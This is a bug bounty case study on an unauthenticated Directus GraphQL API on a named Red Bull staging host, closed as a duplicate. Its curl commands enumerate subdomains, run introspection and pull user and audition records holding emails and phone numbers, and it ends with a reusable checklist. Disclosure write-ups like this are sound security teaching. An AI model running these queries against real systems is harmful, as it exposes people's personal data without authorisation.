# CS-08: The Critical That Paid €0 — Red Bull Directus Duplicate

← [[Case-Studies-Overview]]

**Vuln class:** Broken Access Control + Sensitive Data Exposure (PII)  
**Severity:** Critical / CVSS 9.1 (triager-upgraded from High 7.5)  
**Program:** Red Bull VDP (Intigriti)  
**Report code:** `REDBULL-V1L20L75` — closed **Duplicate** of `REDBULL-9MHOQYNP`  
**The lesson:** A perfectly valid Critical finding that paid €0 — and the full methodology that found it, so you understand every move, not just the curl.

---

## TL;DR

This is the real, un-anonymized report behind [[CS-01-GraphQL-Unauthenticated]]. `batalla-cms-staging.redbull.com` ran Directus CMS with its GraphQL API public and introspection on — zero authentication. One unauthenticated request dumped 140 users (emails, full names, identity IDs — including a confirmed `@redbull.com` employee), 47 auditions (22 with names + phone numbers), and 753 video records.

Technically near-flawless. The triager **raised** the severity from High 7.5 to Critical 9.1, then closed it as a **Duplicate** — €0. Someone found it first.

The lesson is not the bug. It's the methodology that finds it, and everything that happens *after* you're right and still get paid nothing.

---

## Background: The Hunting Funnel (The Quick Version)

Every hunt is a funnel — **broad → narrow → deep**. You don't attack a target; you discover its hosts, fingerprint to find the soft one, then go deep. This finding is that funnel in five moves:

```
ENUMERATE   find all subdomains            → batalla-cms-staging.redbull.com surfaces
FINGERPRINT identify the software          → x-powered-by: Directus
PROBE       test if auth is even required  → introspection with no auth header
EXTRACT     pull a sample to prove impact  → real PII, redacted
QUANTIFY    count records for severity     → 140 / 47 / 753
```

Keep that funnel in your head while reading the steps below. Each step is one stage of it.

---

## How It Was Found

**Step 1: Subdomain enumeration — where did this host come from?**

The host doesn't appear by magic. It comes out of passive enumeration:

```bash
subfinder -d redbull.com -all -silent | httpx -silent -title -tech-detect -status-code
```

`subfinder` pulls from certificate transparency logs and DNS aggregators — Red Bull's TLS cert for the staging box was logged publicly the moment it was issued, so a "hidden" host becomes findable. `httpx` then tells you which hosts are alive and what they're running.

Learn to *read hostnames*. `cms` means there's a content management system here — an admin panel and an API. `staging` means it's less hardened than production and often holds a copy of the real database. Those two words made this host a priority before testing anything. (Full pipeline: [[CS-07-Real-Hunt-Recon-Methodology]].)

**Step 2: Fingerprint the product before attacking it**

You never attack a black box. First answer *"what software is this?"* — because once you know the product, you know its default endpoints and its default mistakes:

```bash
curl -s -I https://batalla-cms-staging.redbull.com | grep -iE 'powered|server'
# x-powered-by: Directus
```

`x-powered-by: Directus` is the whole game. Directus is an open-source headless CMS, so its docs are public and I instantly know it exposes a REST API, a GraphQL API at `/graphql`, an admin panel at `/admin`, and — critically — it has a built-in **"public" role** that, if left misconfigured, lets anonymous users read data. When you identify a known product, go read its docs; five minutes there tells you exactly which defaults are dangerous.

**Step 3: Test the cheapest, highest-signal thing first — introspection**

GraphQL has a built-in feature called **introspection**: a special query that makes the API describe its own entire schema. It's for developer tooling and should be *off* on anything internet-facing, because it hands an attacker the full map.

```bash
curl -s https://batalla-cms-staging.redbull.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
# 200 OK — full schema returned, and NO Authorization header was sent
```

The important detail is what I *didn't* send: no `Authorization` header, no cookie, no token. A `200 OK` with real data back means the endpoint serves anonymous users — and that single fact *is* the Broken Access Control finding. Always probe the assumption **"is authentication actually enforced?"** before anything fancy. If introspection had required a token, the whole approach would change.

**Step 4: Map the data model from the schema**

Introspection works, so the schema now tells you which **collections** (tables) exist. Read it like a menu and pick the sensitive ones:

```bash
curl -s https://batalla-cms-staging.redbull.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

You're scanning for collection names (`users`, `auditions`, `videos`, `events`) and the fields inside them (`email`, `phone`, `full_name`, `password`, `token`). The field names tell you where the PII lives *before* you query a single record. Don't blind-dump everything — read the map, then go straight for what proves impact.

**Step 5: Pull a small sample to prove the data is real**

You've proven anonymous access and you know where the PII is. Now pull a *small* sample — enough to prove it's real, not the whole database:

```bash
# Users — note limit:10. Sample, don't hoover the table.
curl -s https://batalla-cms-staging.redbull.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(limit: 10) { id username full_name email uim_id country { name } status } }"}'

# Auditions — the phone numbers. Strongest PII in the set.
curl -s https://batalla-cms-staging.redbull.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ auditions(limit: 10) { id first_name last_name email phone phone_number status } }"}'
```

`limit: 10` is deliberate and ethical. You need enough to prove it's real PII; you do **not** need to exfiltrate all 140 records — over-pulling real user data can become a problem of its own and looks bad to a triager. In the report you redact the actual values and describe them. The goal is a believable, ethical proof of impact, not a data heist.

**Step 6: Quantify the blast radius**

Severity scales with *how many* people are affected. GraphQL's auto-generated `_aggregated` field gives exact counts in one shot, without dumping rows:

```bash
curl -s https://batalla-cms-staging.redbull.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users_aggregated { count { id } } auditions_aggregated { count { id } } videos_aggregated { count { id } } }"}'
# users: 140 | auditions: 47 | videos: 753
```

"Some users are exposed" is a weak report. "**140** users, **47** applicants with phone numbers, **753** videos" is a severity argument. Always quantify — triagers and CVSS reward demonstrated scale.

**Step 7: Kill the "it's just staging / fake data" objection**

The most common downgrade for a staging finding is *"that's test data, no real impact."* Pre-empt it by finding one undeniably-real record — here, record `id: 758` was a real `@redbull.com` employee email. A corporate-domain email proves the database is production data copied into staging, not synthetic seed data. That one detail is what justified Critical instead of "informative, it's staging." Always disarm the triager's strongest objection *inside* your report, before they raise it.

---

## Why It Works: Root Cause

Directus ships with a **public role** that controls what unauthenticated visitors can read, and GraphQL introspection is enabled by default. When someone spins up a Directus instance, the focus is making the CMS *work*, not locking the public role down to *No Access*. So new collections inherit public read, and introspection is never disabled.

The result: any anonymous visitor can query the whole database. This is a **configuration default, not a code bug** — which is exactly why it repeats across instances (the pattern-replication lesson in [[CS-01-GraphQL-Unauthenticated]]) and, as we'll see, why it gets duplicated so often.

---

## CVSS Breakdown

The triager scored it 9.1. Reconstructing the vector:

```
AV:N  - Internet-facing API
AC:L  - Single unauthenticated POST
PR:N  - Zero credentials  ← the core of the finding
UI:N  - None
S:U   - Scoped to Red Bull systems
C:H   - Real user PII (emails, names, phones, identity IDs)
I:L   - Directus public role often allows writes on misconfig too
A:N   - None

Score: 9.1 CRITICAL
```

I rated my own submission High 7.5 (read-only PII). The triager bumped it to 9.1, likely accounting for public-role *write* exposure and the breadth of identifiable people. Score your own findings honestly: don't undersell (you leave severity on the table) and don't oversell (you lose credibility) — but know the triager can move it either way. See [[Severity-Guide]].

---

## The Real Lesson: Duplicate Economics

This finding was *valid*. It was *Critical*. It paid **€0**. Here's the part nobody teaches.

**1. First-to-report wins the entire bounty.** Bug bounty is winner-take-all per bug. `REDBULL-9MHOQYNP` landed before mine. Identical correctness; the clock decided the payout. There is no second prize for a duplicate.

**2. Default-config bugs are the most-duplicated class.** The bugs most likely to be someone else's duplicate are default credentials/public roles (this one), introspection enabled, `.git` exposed, `/actuator` open, or a known CVE on an unpatched service — anything a `nuclei` template finds. Anyone scanning `*.redbull.com` could trip the same Directus signature. **Low uniqueness = high duplicate risk.** The faster a tool finds it, the more people already have.

**3. How to lower your duplicate rate:**

| Strategy | Why it helps |
|---|---|
| **Report fast** | On default-config bugs, hours matter. Don't sit on it polishing for a day. |
| **Go deeper than the scanner** | A scanner finds "introspection on." Chain it to *writes* (mutation access) or admin takeover and you move from common dup into unique territory. |
| **Hunt business logic, not config** | IDOR in a custom workflow, a broken multi-step auth flow — not in anyone's template. Far lower dup rate. |
| **Pick deeper assets** | The obvious `cms-staging` subdomain is everyone's first stop. The 4th-level subdomain nobody enumerated is where uniqueness lives. |

**4. What this finding was actually worth.** €0 in cash — but it confirmed the recon + Directus playbook works against a top-tier program, produced two teaching artifacts, and reinforced the habit of proving real-data impact. That's tuition, not a loss — *as long as you adjust*. If you keep firing default-config bugs at popular VDPs and keep eating duplicates, the methodology needs to shift toward uniqueness, not more volume.

---

## Duplicate vs N/A — Don't Confuse Them

Two very different "no payout" outcomes that juniors mix up constantly:

| Outcome | Meaning | What it says about you |
|---|---|---|
| **Duplicate** | Real bug, someone beat you to it | Your finding was *correct* — speed/uniqueness problem |
| **N/A / Informative** | Not a valid issue, or no real impact | Your *triage judgment* was off — revisit the 7-Question Gate |

> [!TIP]
> A Critical duplicate is a **green flag** for your skills — it confirms your methodology finds real, paid-class bugs. A string of N/As is a **red flag** for your validation discipline. See [[CS-03-JWT-Auth-Bypass-And-NA-Lesson]].

---

## Quick Checklist: Directus / Default-Config Testing

```bash
# 1. Fingerprint — is it Directus?
curl -s -I https://TARGET | grep -i powered      # x-powered-by: Directus

# 2. Is auth enforced? (introspection, no auth header)
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# 3. Map collections + fields → find where PII/creds live
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 4. Sample (limit:10), don't dump everything
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users(limit: 10) { id email full_name } }"}'

# 5. Quantify for severity
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users_aggregated { count { id } } }"}'

# 6. Find one real record (corporate email / real phone) → kills "it's just staging"
```

**Duplicate defense, in one line:** if `nuclei` could find it, assume you're in a race — submit fast, or add a chain step (read → write → RCE/ATO) to make it uniquely yours.

---

*Related: [[CS-01-GraphQL-Unauthenticated]] | [[CS-03-JWT-Auth-Bypass-And-NA-Lesson]] | [[CS-07-Real-Hunt-Recon-Methodology]] | [[GraphQL-Security]] | [[A01-Broken-Access-Control]] | [[Reporting-Guide]] | [[Severity-Guide]]*

*Sources: Real Intigriti submission `REDBULL-V1L20L75` (closed Duplicate of `REDBULL-9MHOQYNP`), Red Bull VDP, Directus CMS documentation.*
